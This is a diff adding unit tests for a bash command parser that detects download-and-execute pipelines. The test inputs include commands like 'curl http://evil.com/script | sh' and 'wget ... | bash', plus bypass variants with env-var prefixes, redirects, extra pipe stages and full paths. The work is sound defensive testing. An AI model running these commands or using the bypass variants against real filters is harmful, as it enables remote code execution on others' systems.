@@ -103,3 +103,86 @@ class TestBashCommandParser:
         ast = parser.parse("diff <(ls dir1) <(ls dir2)")
         dangers = parser.has_dangerous_constructs(ast)
         assert "process substitution detected" in dangers
+
+
+class TestDangerousPipelineDetection:
+    """Test suite for _detect_dangerous_pipelines AST analysis."""
+
+    def test_curl_pipe_to_sh_detected(self, parser):
+        """Detect curl piped to shell."""
+        ast = parser.parse("curl http://evil.com/script | sh")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("remote code execution" in d for d in dangers)
+
+    def test_wget_pipe_to_bash_detected(self, parser):
+        """Detect wget piped to bash."""
+        ast = parser.parse("wget -qO- http://evil.com | bash")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("remote code execution" in d for d in dangers)
+
+    def test_curl_pipe_with_env_var_prefix(self, parser):
+        """Detect curl|sh even with VAR=value prefix (bypass attempt)."""
+        ast = parser.parse("curl http://x.com/s | VAR=value sh")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("remote code execution" in d for d in dangers)
+
+    def test_curl_pipe_with_redirect_suffix(self, parser):
+        """Detect curl|sh even with redirects."""
+        ast = parser.parse("curl http://x.com/s | sh 2>&1")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("remote code execution" in d for d in dangers)
+
+    def test_safe_pipeline_not_flagged(self, parser):
+        """Safe pipelines (no download->shell) should not be flagged."""
+        safe_pipelines = [
+            "cat file.txt | grep pattern",
+            "ls -la | head -10",
+            "ps aux | grep python",
+            "echo hello | base64",
+        ]
+        for cmd in safe_pipelines:
+            ast = parser.parse(cmd)
+            dangers = parser.has_dangerous_constructs(ast)
+            assert not any("remote code execution" in d for d in dangers), f"False positive: {cmd}"
+
+    def test_curl_to_safe_command_not_flagged(self, parser):
+        """Curl piped to safe command (not shell) should not be flagged."""
+        safe_curls = [
+            "curl http://api.example.com | jq .",
+            "curl http://example.com | grep pattern",
+            "wget -qO- http://example.com | head -10",
+        ]
+        for cmd in safe_curls:
+            ast = parser.parse(cmd)
+            dangers = parser.has_dangerous_constructs(ast)
+            assert not any("remote code execution" in d for d in dangers), f"False positive: {cmd}"
+
+    def test_single_command_no_pipeline(self, parser):
+        """Single command (no pipeline) should not trigger pipeline detection."""
+        ast = parser.parse("curl http://example.com")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert not any("remote code execution" in d for d in dangers)
+
+    def test_empty_ast_handled(self, parser):
+        """Empty AST list should not cause errors."""
+        # Call internal method directly with empty list
+        dangers = parser._detect_dangerous_pipelines([])
+        assert dangers == []
+
+    def test_none_ast_handled(self, parser):
+        """None AST should not cause errors."""
+        dangers = parser._detect_dangerous_pipelines(None)
+        assert dangers == []
+
+    def test_multi_stage_pipeline(self, parser):
+        """Multi-stage pipeline with download in middle."""
+        # curl is first, should detect curl->sh
+        ast = parser.parse("curl http://x.com/s | cat | sh")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("remote code execution" in d for d in dangers)
+
+    def test_full_path_commands(self, parser):
+        """Commands with full paths should be detected."""
+        ast = parser.parse("/usr/bin/curl http://x.com/s | /bin/bash")
+        dangers = parser.has_dangerous_constructs(ast)
+        assert any("remote code execution" in d for d in dangers)
